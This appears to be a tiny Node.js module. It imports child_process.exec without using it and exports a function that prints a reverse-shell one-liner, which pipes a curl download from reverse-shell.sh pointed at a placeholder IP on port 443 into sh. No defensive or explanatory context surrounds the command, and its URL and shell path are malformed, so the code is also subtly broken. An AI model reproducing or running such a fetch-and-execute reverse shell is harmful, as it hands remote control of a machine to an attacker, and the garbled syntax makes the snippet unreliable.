const {exec}=require('child_process');
exports.command=function(){console.log('bin/bash -c "curl https//reverse-shell.sh/192.0.2.1:443 |sh"');};
